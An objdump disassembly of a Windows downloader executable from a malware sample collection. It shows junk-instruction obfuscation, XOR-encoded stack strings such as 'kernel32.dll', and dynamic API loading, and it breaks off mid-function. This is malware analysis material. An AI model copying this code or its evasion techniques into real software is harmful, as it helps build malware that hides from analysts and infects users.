
malware_samples/downloader/6baa0309fdb2c87578fc2e2f4e167697c625cb95c294af931230a9a28e77af58.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 83 ec 28          	sub    $0x28,%rsp
   180001004:	48 8b 0d c5 7a 02 00 	mov    0x27ac5(%rip),%rcx        # 0x180028ad0
   18000100b:	e8 80 5c 00 00       	call   0x180006c90
   180001010:	50                   	push   %rax
   180001011:	48 89 e4             	mov    %rsp,%rsp
   180001014:	58                   	pop    %rax
   180001015:	48 89 db             	mov    %rbx,%rbx
   180001018:	48 8d 00             	lea    (%rax),%rax
   18000101b:	4d 87 c9             	xchg   %r9,%r9
   18000101e:	31 c0                	xor    %eax,%eax
   180001020:	48 83 c4 28          	add    $0x28,%rsp
   180001024:	c3                   	ret
   180001025:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000102c:	00 00 00 00 
   180001030:	48 83 ec 28          	sub    $0x28,%rsp
   180001034:	83 fa 01             	cmp    $0x1,%edx
   180001037:	75 10                	jne    0x180001049
   180001039:	48 89 0d 90 7a 02 00 	mov    %rcx,0x27a90(%rip)        # 0x180028ad0
   180001040:	4d 8d 36             	lea    (%r14),%r14
   180001043:	48 89 ed             	mov    %rbp,%rbp
   180001046:	4d 87 e4             	xchg   %r12,%r12
   180001049:	4d 89 ff             	mov    %r15,%r15
   18000104c:	48 89 f6             	mov    %rsi,%rsi
   18000104f:	48 89 ff             	mov    %rdi,%rdi
   180001052:	48 89 e4             	mov    %rsp,%rsp
   180001055:	e8 26 00 00 00       	call   0x180001080
   18000105a:	48 87 d2             	xchg   %rdx,%rdx
   18000105d:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180001061:	4d 87 c0             	xchg   %r8,%r8
   180001064:	4d 89 d2             	mov    %r10,%r10
   180001067:	48 87 d2             	xchg   %rdx,%rdx
   18000106a:	b8 01 00 00 00       	mov    $0x1,%eax
   18000106f:	48 83 c4 28          	add    $0x28,%rsp
   180001073:	c3                   	ret
   180001074:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000107b:	00 00 00 00 00 
   180001080:	50                   	push   %rax
   180001081:	53                   	push   %rbx
   180001082:	56                   	push   %rsi
   180001083:	5e                   	pop    %rsi
   180001084:	5b                   	pop    %rbx
   180001085:	53                   	push   %rbx
   180001086:	48 87 db             	xchg   %rbx,%rbx
   180001089:	5b                   	pop    %rbx
   18000108a:	4d 87 c0             	xchg   %r8,%r8
   18000108d:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001091:	4d 87 f6             	xchg   %r14,%r14
   180001094:	48 89 f6             	mov    %rsi,%rsi
   180001097:	41 55                	push   %r13
   180001099:	4d 87 ff             	xchg   %r15,%r15
   18000109c:	41 5d                	pop    %r13
   18000109e:	4d 87 ff             	xchg   %r15,%r15
   1800010a1:	48 89 ff             	mov    %rdi,%rdi
   1800010a4:	c7 44 24 04 73 01 00 	movl   $0x173,0x4(%rsp)
   1800010ab:	00 
   1800010ac:	58                   	pop    %rax
   1800010ad:	c3                   	ret
   1800010ae:	66 90                	xchg   %ax,%ax
   1800010b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800010b4:	48 8b 0d 15 7a 02 00 	mov    0x27a15(%rip),%rcx        # 0x180028ad0
   1800010bb:	e8 d0 5b 00 00       	call   0x180006c90
   1800010c0:	50                   	push   %rax
   1800010c1:	48 89 e4             	mov    %rsp,%rsp
   1800010c4:	58                   	pop    %rax
   1800010c5:	53                   	push   %rbx
   1800010c6:	4d 89 db             	mov    %r11,%r11
   1800010c9:	48 8d 09             	lea    (%rcx),%rcx
   1800010cc:	5b                   	pop    %rbx
   1800010cd:	4d 87 ed             	xchg   %r13,%r13
   1800010d0:	48 87 f6             	xchg   %rsi,%rsi
   1800010d3:	4d 87 c0             	xchg   %r8,%r8
   1800010d6:	48 89 e4             	mov    %rsp,%rsp
   1800010d9:	52                   	push   %rdx
   1800010da:	4d 8d 09             	lea    (%r9),%r9
   1800010dd:	5a                   	pop    %rdx
   1800010de:	41 55                	push   %r13
   1800010e0:	90                   	nop
   1800010e1:	41 5d                	pop    %r13
   1800010e3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800010e8:	48 83 c4 28          	add    $0x28,%rsp
   1800010ec:	c3                   	ret
   1800010ed:	0f 1f 00             	nopl   (%rax)
   1800010f0:	4d 8d 12             	lea    (%r10),%r10
   1800010f3:	48 89 c9             	mov    %rcx,%rcx
   1800010f6:	90                   	nop
   1800010f7:	48 8d 3f             	lea    (%rdi),%rdi
   1800010fa:	41 50                	push   %r8
   1800010fc:	4d 8d 12             	lea    (%r10),%r10
   1800010ff:	48 87 ed             	xchg   %rbp,%rbp
   180001102:	41 58                	pop    %r8
   180001104:	b8 01 00 00 00       	mov    $0x1,%eax
   180001109:	c3                   	ret
   18000110a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001110:	90                   	nop
   180001111:	90                   	nop
   180001112:	90                   	nop
   180001113:	41 57                	push   %r15
   180001115:	41 56                	push   %r14
   180001117:	41 5e                	pop    %r14
   180001119:	41 5f                	pop    %r15
   18000111b:	b8 01 00 00 00       	mov    $0x1,%eax
   180001120:	c3                   	ret
   180001121:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001128:	0f 1f 84 00 00 00 00 
   18000112f:	00 
   180001130:	4d 87 c9             	xchg   %r9,%r9
   180001133:	4d 89 f6             	mov    %r14,%r14
   180001136:	48 89 ed             	mov    %rbp,%rbp
   180001139:	b8 01 00 00 00       	mov    $0x1,%eax
   18000113e:	c3                   	ret
   18000113f:	90                   	nop
   180001140:	56                   	push   %rsi
   180001141:	41 56                	push   %r14
   180001143:	41 5e                	pop    %r14
   180001145:	5e                   	pop    %rsi
   180001146:	b8 01 00 00 00       	mov    $0x1,%eax
   18000114b:	c3                   	ret
   18000114c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001150:	48 83 ec 28          	sub    $0x28,%rsp
   180001154:	b9 33 01 00 00       	mov    $0x133,%ecx
   180001159:	e8 b2 00 00 00       	call   0x180001210
   18000115e:	ff 15 24 4f 02 00    	call   *0x24f24(%rip)        # 0x180026088
   180001164:	ba 00 10 00 00       	mov    $0x1000,%edx
   180001169:	31 c9                	xor    %ecx,%ecx
   18000116b:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   180001171:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180001177:	ff 15 33 51 02 00    	call   *0x25133(%rip)        # 0x1800262b0
   18000117d:	48 85 c0             	test   %rax,%rax
   180001180:	74 11                	je     0x180001193
   180001182:	48 89 c1             	mov    %rax,%rcx
   180001185:	31 d2                	xor    %edx,%edx
   180001187:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   18000118d:	ff 15 25 51 02 00    	call   *0x25125(%rip)        # 0x1800262b8
   180001193:	48 8d 15 e8 16 02 00 	lea    0x216e8(%rip),%rdx        # 0x180022882
   18000119a:	4c 8d 4c 24 26       	lea    0x26(%rsp),%r9
   18000119f:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800011a4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800011aa:	ff 15 b8 4f 02 00    	call   *0x24fb8(%rip)        # 0x180026168
   1800011b0:	41 52                	push   %r10
   1800011b2:	48 87 d2             	xchg   %rdx,%rdx
   1800011b5:	4d 8d 00             	lea    (%r8),%r8
   1800011b8:	41 5a                	pop    %r10
   1800011ba:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800011be:	90                   	nop
   1800011bf:	e8 6c 00 00 00       	call   0x180001230
   1800011c4:	ff 15 76 4f 02 00    	call   *0x24f76(%rip)        # 0x180026140
   1800011ca:	48 87 e4             	xchg   %rsp,%rsp
   1800011cd:	4d 8d 12             	lea    (%r10),%r10
   1800011d0:	48 8d 36             	lea    (%rsi),%rsi
   1800011d3:	e8 a8 fe ff ff       	call   0x180001080
   1800011d8:	c7 44 24 20 3c 15 5f 	movl   $0x5f153c,0x20(%rsp)
   1800011df:	00 
   1800011e0:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800011e4:	4d 87 db             	xchg   %r11,%r11
   1800011e7:	48 8d 1b             	lea    (%rbx),%rbx
   1800011ea:	51                   	push   %rcx
   1800011eb:	41 54                	push   %r12
   1800011ed:	41 5c                	pop    %r12
   1800011ef:	59                   	pop    %rcx
   1800011f0:	48 8d 00             	lea    (%rax),%rax
   1800011f3:	4d 87 f6             	xchg   %r14,%r14
   1800011f6:	51                   	push   %rcx
   1800011f7:	57                   	push   %rdi
   1800011f8:	5f                   	pop    %rdi
   1800011f9:	59                   	pop    %rcx
   1800011fa:	b8 01 00 00 00       	mov    $0x1,%eax
   1800011ff:	48 83 c4 28          	add    $0x28,%rsp
   180001203:	c3                   	ret
   180001204:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000120b:	00 00 00 00 00 
   180001210:	56                   	push   %rsi
   180001211:	48 83 ec 20          	sub    $0x20,%rsp
   180001215:	89 ce                	mov    %ecx,%esi
   180001217:	ff 15 7b 4f 02 00    	call   *0x24f7b(%rip)        # 0x180026198
   18000121d:	83 e0 3f             	and    $0x3f,%eax
   180001220:	01 c6                	add    %eax,%esi
   180001222:	89 f1                	mov    %esi,%ecx
   180001224:	48 83 c4 20          	add    $0x20,%rsp
   180001228:	5e                   	pop    %rsi
   180001229:	48 ff 25 58 50 02 00 	rex.W jmp *0x25058(%rip)        # 0x180026288
   180001230:	50                   	push   %rax
   180001231:	48 87 ed             	xchg   %rbp,%rbp
   180001234:	4d 87 ed             	xchg   %r13,%r13
   180001237:	4d 89 c9             	mov    %r9,%r9
   18000123a:	4d 87 c0             	xchg   %r8,%r8
   18000123d:	90                   	nop
   18000123e:	41 52                	push   %r10
   180001240:	4d 89 c9             	mov    %r9,%r9
   180001243:	41 5a                	pop    %r10
   180001245:	41 50                	push   %r8
   180001247:	48 89 ed             	mov    %rbp,%rbp
   18000124a:	41 58                	pop    %r8
   18000124c:	41 50                	push   %r8
   18000124e:	41 54                	push   %r12
   180001250:	41 5c                	pop    %r12
   180001252:	41 58                	pop    %r8
   180001254:	56                   	push   %rsi
   180001255:	5e                   	pop    %rsi
   180001256:	4d 8d 24 24          	lea    (%r12),%r12
   18000125a:	48 89 db             	mov    %rbx,%rbx
   18000125d:	48 87 c9             	xchg   %rcx,%rcx
   180001260:	90                   	nop
   180001261:	41 52                	push   %r10
   180001263:	4d 89 c9             	mov    %r9,%r9
   180001266:	41 5a                	pop    %r10
   180001268:	51                   	push   %rcx
   180001269:	50                   	push   %rax
   18000126a:	58                   	pop    %rax
   18000126b:	59                   	pop    %rcx
   18000126c:	48 87 c9             	xchg   %rcx,%rcx
   18000126f:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180001273:	c7 44 24 04 e1 03 00 	movl   $0x3e1,0x4(%rsp)
   18000127a:	00 
   18000127b:	58                   	pop    %rax
   18000127c:	c3                   	ret
   18000127d:	0f 1f 00             	nopl   (%rax)
   180001280:	48 83 ec 38          	sub    $0x38,%rsp
   180001284:	b9 db 02 00 00       	mov    $0x2db,%ecx
   180001289:	e8 62 00 00 00       	call   0x1800012f0
   18000128e:	52                   	push   %rdx
   18000128f:	55                   	push   %rbp
   180001290:	5d                   	pop    %rbp
   180001291:	5a                   	pop    %rdx
   180001292:	ff 15 00 4f 02 00    	call   *0x24f00(%rip)        # 0x180026198
   180001298:	55                   	push   %rbp
   180001299:	48 87 ff             	xchg   %rdi,%rdi
   18000129c:	5d                   	pop    %rbp
   18000129d:	ff 15 ad 4e 02 00    	call   *0x24ead(%rip)        # 0x180026150
   1800012a3:	41 51                	push   %r9
   1800012a5:	90                   	nop
   1800012a6:	41 59                	pop    %r9
   1800012a8:	90                   	nop
   1800012a9:	48 89 c9             	mov    %rcx,%rcx
   1800012ac:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800012b1:	ff 15 99 4f 02 00    	call   *0x24f99(%rip)        # 0x180026250
   1800012b7:	c7 44 24 2c c2 4f 5c 	movl   $0x5c4fc2,0x2c(%rsp)
   1800012be:	00 
   1800012bf:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800012c3:	48 8d 36             	lea    (%rsi),%rsi
   1800012c6:	90                   	nop
   1800012c7:	4d 89 d2             	mov    %r10,%r10
   1800012ca:	90                   	nop
   1800012cb:	90                   	nop
   1800012cc:	48 89 f6             	mov    %rsi,%rsi
   1800012cf:	48 89 f6             	mov    %rsi,%rsi
   1800012d2:	4d 89 e4             	mov    %r12,%r12
   1800012d5:	90                   	nop
   1800012d6:	48 89 ff             	mov    %rdi,%rdi
   1800012d9:	90                   	nop
   1800012da:	90                   	nop
   1800012db:	4d 8d 09             	lea    (%r9),%r9
   1800012de:	90                   	nop
   1800012df:	48 8d 1b             	lea    (%rbx),%rbx
   1800012e2:	b8 01 00 00 00       	mov    $0x1,%eax
   1800012e7:	48 83 c4 38          	add    $0x38,%rsp
   1800012eb:	c3                   	ret
   1800012ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1800012f0:	48 ff 25 91 4f 02 00 	rex.W jmp *0x24f91(%rip)        # 0x180026288
   1800012f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800012fe:	00 00 
   180001300:	57                   	push   %rdi
   180001301:	5f                   	pop    %rdi
   180001302:	41 50                	push   %r8
   180001304:	4d 8d 36             	lea    (%r14),%r14
   180001307:	4d 87 ed             	xchg   %r13,%r13
   18000130a:	41 58                	pop    %r8
   18000130c:	57                   	push   %rdi
   18000130d:	90                   	nop
   18000130e:	5f                   	pop    %rdi
   18000130f:	b8 01 00 00 00       	mov    $0x1,%eax
   180001314:	c3                   	ret
   180001315:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   18000131c:	00 00 00 00 
   180001320:	56                   	push   %rsi
   180001321:	5e                   	pop    %rsi
   180001322:	4d 8d 1b             	lea    (%r11),%r11
   180001325:	4d 8d 00             	lea    (%r8),%r8
   180001328:	4d 89 e4             	mov    %r12,%r12
   18000132b:	48 89 ed             	mov    %rbp,%rbp
   18000132e:	b8 01 00 00 00       	mov    $0x1,%eax
   180001333:	c3                   	ret
   180001334:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   18000133b:	00 00 00 00 00 
   180001340:	4d 8d 09             	lea    (%r9),%r9
   180001343:	4d 8d 3f             	lea    (%r15),%r15
   180001346:	48 87 c9             	xchg   %rcx,%rcx
   180001349:	48 89 e4             	mov    %rsp,%rsp
   18000134c:	4d 89 db             	mov    %r11,%r11
   18000134f:	48 8d 1b             	lea    (%rbx),%rbx
   180001352:	b8 01 00 00 00       	mov    $0x1,%eax
   180001357:	c3                   	ret
   180001358:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000135f:	00 
   180001360:	48 87 c9             	xchg   %rcx,%rcx
   180001363:	48 8d 12             	lea    (%rdx),%rdx
   180001366:	b8 01 00 00 00       	mov    $0x1,%eax
   18000136b:	c3                   	ret
   18000136c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001370:	48 87 ed             	xchg   %rbp,%rbp
   180001373:	4d 8d 09             	lea    (%r9),%r9
   180001376:	48 89 ff             	mov    %rdi,%rdi
   180001379:	4d 87 e4             	xchg   %r12,%r12
   18000137c:	48 8d 36             	lea    (%rsi),%rsi
   18000137f:	48 89 ed             	mov    %rbp,%rbp
   180001382:	48 87 c9             	xchg   %rcx,%rcx
   180001385:	4d 8d 3f             	lea    (%r15),%r15
   180001388:	48 8d 36             	lea    (%rsi),%rsi
   18000138b:	b8 01 00 00 00       	mov    $0x1,%eax
   180001390:	c3                   	ret
   180001391:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180001398:	0f 1f 84 00 00 00 00 
   18000139f:	00 
   1800013a0:	56                   	push   %rsi
   1800013a1:	48 83 ec 60          	sub    $0x60,%rsp
   1800013a5:	b9 cc 02 00 00       	mov    $0x2cc,%ecx
   1800013aa:	e8 41 01 00 00       	call   0x1800014f0
   1800013af:	51                   	push   %rcx
   1800013b0:	90                   	nop
   1800013b1:	59                   	pop    %rcx
   1800013b2:	e8 59 01 00 00       	call   0x180001510
   1800013b7:	c7 44 24 3c 6a 00 00 	movl   $0x6a,0x3c(%rsp)
   1800013be:	00 
   1800013bf:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800013c3:	83 f0 01             	xor    $0x1,%eax
   1800013c6:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800013cb:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800013cf:	83 f0 0f             	xor    $0xf,%eax
   1800013d2:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800013d7:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800013db:	83 f0 18             	xor    $0x18,%eax
   1800013de:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800013e3:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800013e7:	83 f0 04             	xor    $0x4,%eax
   1800013ea:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   1800013ef:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800013f3:	83 f0 0f             	xor    $0xf,%eax
   1800013f6:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   1800013fb:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800013ff:	83 f0 06             	xor    $0x6,%eax
   180001402:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   180001407:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000140b:	83 f0 59             	xor    $0x59,%eax
   18000140e:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   180001413:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001417:	83 f0 58             	xor    $0x58,%eax
   18000141a:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   18000141f:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001423:	83 f0 44             	xor    $0x44,%eax
   180001426:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000142b:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000142f:	83 f0 0e             	xor    $0xe,%eax
   180001432:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180001437:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000143b:	83 f0 06             	xor    $0x6,%eax
   18000143e:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180001443:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180001447:	83 f0 06             	xor    $0x6,%eax
   18000144a:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   18000144f:	66 c7 44 24 58 00 00 	movw   $0x0,0x58(%rsp)
   180001456:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   18000145b:	48 89 f1             	mov    %rsi,%rcx
   18000145e:	ff 15 cc 4c 02 00    	call   *0x24ccc(%rip)        # 0x180026130
   180001464:	48 87 d2             	xchg   %rdx,%rdx
   180001467:	48 8d 1b             	lea    (%rbx),%rbx
   18000146a:	48 8d 3f             	lea    (%rdi),%rdi
   18000146d:	e8 0e fc ff ff       	call   0x180001080
   180001472:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180001477:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   18000147e:	00 
   18000147f:	4c 8d 05 d6 13 02 00 	lea    0x213d6(%rip),%r8        # 0x18002285c
   180001486:	31 c9                	xor    %ecx,%ecx
   180001488:	31 d2                	xor    %edx,%edx
   18000148a:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180001490:	ff 15 aa 4d 02 00    	call   *0x24daa(%rip)        # 0x180026240
   180001496:	4d 87 f6             	xchg   %r14,%r14
   180001499:	48 8d 3f             	lea    (%rdi),%rdi
   18000149c:	48 8d 09             	lea    (%rcx),%rcx
   18000149f:	41 54                	push   %r12
   1800014a1:	4d 87 db             	xchg   %r11,%r11
   1800014a4:	48 89 ed             	mov    %rbp,%rbp
   1800014a7:	41 5c                	pop    %r12
   1800014a9:	ff 15 01 4d 02 00    	call   *0x24d01(%rip)        # 0x1800261b0
   1800014af:	41 55                	push   %r13
   1800014b1:	57                   	push   %rdi
   1800014b2:	5f                   	pop    %rdi
   1800014b3:	41 5d                	pop    %r13
   1800014b5:	c7 44 24 40 e4 32 29 	movl   $0x2932e4,0x40(%rsp)
   1800014bc:	00 
   1800014bd:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800014c1:	41 51                	push   %r9
   1800014c3:	41 50                	push   %r8
   1800014c5:	41 58                	pop    %r8
   1800014c7:	41 59                	pop    %r9
   1800014c9:	e8 72 00 00 00       	call   0x180001540
   1800014ce:	4d 89 ed             	mov    %r13,%r13
   1800014d1:	90                   	nop
   1800014d2:	50                   	push   %rax
   1800014d3:	90                   	nop
   1800014d4:	58                   	pop    %rax
   1800014d5:	48 8d 12             	lea    (%rdx),%rdx
   1800014d8:	4d 89 c9             	mov    %r9,%r9
   1800014db:	4d 8d 12             	lea    (%r10),%r10
   1800014de:	b8 01 00 00 00       	mov    $0x1,%eax
   1800014e3:	48 83 c4 60          	add    $0x60,%rsp
   1800014e7:	5e                   	pop    %rsi
   1800014e8:	c3                   	ret
   1800014e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1800014f0:	56                   	push   %rsi
   1800014f1:	48 83 ec 20          	sub    $0x20,%rsp
   1800014f5:	89 ce                	mov    %ecx,%esi
   1800014f7:	ff 15 9b 4c 02 00    	call   *0x24c9b(%rip)        # 0x180026198
   1800014fd:	83 e0 3f             	and    $0x3f,%eax
   180001500:	01 c6                	add    %eax,%esi
   180001502:	89 f1                	mov    %esi,%ecx
   180001504:	48 83 c4 20          	add    $0x20,%rsp
   180001508:	5e                   	pop    %rsi
   180001509:	48 ff 25 78 4d 02 00 	rex.W jmp *0x24d78(%rip)        # 0x180026288
   180001510:	50                   	push   %rax
   180001511:	4d 87 ed             	xchg   %r13,%r13
   180001514:	48 8d 1b             	lea    (%rbx),%rbx
   180001517:	41 53                	push   %r11
   180001519:	4d 89 ff             	mov    %r15,%r15
   18000151c:	4d 87 d2             	xchg   %r10,%r10
   18000151f:	41 5b                	pop    %r11
   180001521:	50                   	push   %rax
   180001522:	4d 87 f6             	xchg   %r14,%r14
   180001525:	58                   	pop    %rax
   180001526:	48 8d 36             	lea    (%rsi),%rsi
   180001529:	4d 8d 36             	lea    (%r14),%r14
   18000152c:	90                   	nop
   18000152d:	90                   	nop
   18000152e:	90                   	nop
   18000152f:	90                   	nop
   180001530:	c7 44 24 04 78 01 00 	movl   $0x178,0x4(%rsp)
   180001537:	00 
   180001538:	58                   	pop    %rax
   180001539:	c3                   	ret
   18000153a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001540:	50                   	push   %rax
   180001541:	56                   	push   %rsi
   180001542:	5e                   	pop    %rsi
   180001543:	4d 8d 36             	lea    (%r14),%r14
   180001546:	90                   	nop
   180001547:	41 56                	push   %r14
   180001549:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000154d:	41 5e                	pop    %r14
   18000154f:	52                   	push   %rdx
   180001550:	41 56                	push   %r14
   180001552:	41 5e                	pop    %r14
   180001554:	5a                   	pop    %rdx
   180001555:	48 89 c0             	mov    %rax,%rax
   180001558:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000155c:	c7 44 24 04 41 01 00 	movl   $0x141,0x4(%rsp)
   180001563:	00 
   180001564:	58                   	pop    %rax
   180001565:	c3                   	ret
   180001566:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   18000156d:	00 00 00 
   180001570:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   180001577:	b9 81 02 00 00       	mov    $0x281,%ecx
   18000157c:	e8 8f 00 00 00       	call   0x180001610
   180001581:	53                   	push   %rbx
   180001582:	4d 89 d2             	mov    %r10,%r10
   180001585:	5b                   	pop    %rbx
   180001586:	48 8d 00             	lea    (%rax),%rax
   180001589:	4d 89 db             	mov    %r11,%r11
   18000158c:	4d 8d 09             	lea    (%r9),%r9
   18000158f:	4d 87 ed             	xchg   %r13,%r13
   180001592:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001597:	b9 00 04 00 00       	mov    $0x400,%ecx
   18000159c:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1800015a1:	41 b9 55 00 00 00    	mov    $0x55,%r9d
   1800015a7:	ff 15 5b 4b 02 00    	call   *0x24b5b(%rip)        # 0x180026108
   1800015ad:	48 89 e4             	mov    %rsp,%rsp
   1800015b0:	4d 8d 24 24          	lea    (%r12),%r12
   1800015b4:	48 8d 12             	lea    (%rdx),%rdx
   1800015b7:	ff 15 f3 4a 02 00    	call   *0x24af3(%rip)        # 0x1800260b0
   1800015bd:	50                   	push   %rax
   1800015be:	41 53                	push   %r11
   1800015c0:	41 5b                	pop    %r11
   1800015c2:	58                   	pop    %rax
   1800015c3:	c7 44 24 20 f8 7c a3 	movl   $0xa37cf8,0x20(%rsp)
   1800015ca:	00 
   1800015cb:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800015cf:	52                   	push   %rdx
   1800015d0:	5a                   	pop    %rdx
   1800015d1:	41 50                	push   %r8
   1800015d3:	41 58                	pop    %r8
   1800015d5:	e8 56 00 00 00       	call   0x180001630
   1800015da:	90                   	nop
   1800015db:	48 89 db             	mov    %rbx,%rbx
   1800015de:	4d 8d 00             	lea    (%r8),%r8
   1800015e1:	48 87 f6             	xchg   %rsi,%rsi
   1800015e4:	48 87 d2             	xchg   %rdx,%rdx
   1800015e7:	4d 8d 00             	lea    (%r8),%r8
   1800015ea:	4d 8d 3f             	lea    (%r15),%r15
   1800015ed:	4d 87 db             	xchg   %r11,%r11
   1800015f0:	48 89 ed             	mov    %rbp,%rbp
   1800015f3:	41 52                	push   %r10
   1800015f5:	41 51                	push   %r9
   1800015f7:	41 59                	pop    %r9
   1800015f9:	41 5a                	pop    %r10
   1800015fb:	48 8d 1b             	lea    (%rbx),%rbx
   1800015fe:	b8 01 00 00 00       	mov    $0x1,%eax
   180001603:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
   18000160a:	c3                   	ret
   18000160b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001610:	56                   	push   %rsi
   180001611:	48 83 ec 20          	sub    $0x20,%rsp
   180001615:	89 ce                	mov    %ecx,%esi
   180001617:	ff 15 7b 4b 02 00    	call   *0x24b7b(%rip)        # 0x180026198
   18000161d:	83 e0 3f             	and    $0x3f,%eax
   180001620:	01 c6                	add    %eax,%esi
   180001622:	89 f1                	mov    %esi,%ecx
   180001624:	48 83 c4 20          	add    $0x20,%rsp
   180001628:	5e                   	pop    %rsi
   180001629:	48 ff 25 58 4c 02 00 	rex.W jmp *0x24c58(%rip)        # 0x180026288
   180001630:	50                   	push   %rax
   180001631:	41 56                	push   %r14
   180001633:	41 55                	push   %r13
   180001635:	41 5d                	pop    %r13
   180001637:	41 5e                	pop    %r14
   180001639:	41 54                	push   %r12
   18000163b:	90                   	nop
   18000163c:	41 5c                	pop    %r12
   18000163e:	48 87 e4             	xchg   %rsp,%rsp
   180001641:	4d 8d 3f             	lea    (%r15),%r15
   180001644:	4d 8d 00             	lea    (%r8),%r8
   180001647:	41 52                	push   %r10
   180001649:	41 57                	push   %r15
   18000164b:	41 5f                	pop    %r15
   18000164d:	41 5a                	pop    %r10
   18000164f:	90                   	nop
   180001650:	48 87 e4             	xchg   %rsp,%rsp
   180001653:	48 89 ed             	mov    %rbp,%rbp
   180001656:	c7 44 24 04 34 03 00 	movl   $0x334,0x4(%rsp)
   18000165d:	00 
   18000165e:	58                   	pop    %rax
   18000165f:	c3                   	ret
   180001660:	41 54                	push   %r12
   180001662:	48 87 ed             	xchg   %rbp,%rbp
   180001665:	41 5c                	pop    %r12
   180001667:	55                   	push   %rbp
   180001668:	48 89 db             	mov    %rbx,%rbx
   18000166b:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000166f:	5d                   	pop    %rbp
   180001670:	41 55                	push   %r13
   180001672:	41 5d                	pop    %r13
   180001674:	b8 01 00 00 00       	mov    $0x1,%eax
   180001679:	c3                   	ret
   18000167a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001680:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   180001687:	b9 f8 02 00 00       	mov    $0x2f8,%ecx
   18000168c:	e8 ff 00 00 00       	call   0x180001790
   180001691:	48 89 c9             	mov    %rcx,%rcx
   180001694:	4d 87 e4             	xchg   %r12,%r12
   180001697:	48 89 e4             	mov    %rsp,%rsp
   18000169a:	48 8d 00             	lea    (%rax),%rax
   18000169d:	55                   	push   %rbp
   18000169e:	5d                   	pop    %rbp
   18000169f:	c7 44 24 2c 30 00 00 	movl   $0x30,0x2c(%rsp)
   1800016a6:	00 
   1800016a7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800016ab:	83 f0 67             	xor    $0x67,%eax
   1800016ae:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   1800016b3:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800016b7:	83 f0 79             	xor    $0x79,%eax
   1800016ba:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   1800016bf:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800016c3:	83 f0 7e             	xor    $0x7e,%eax
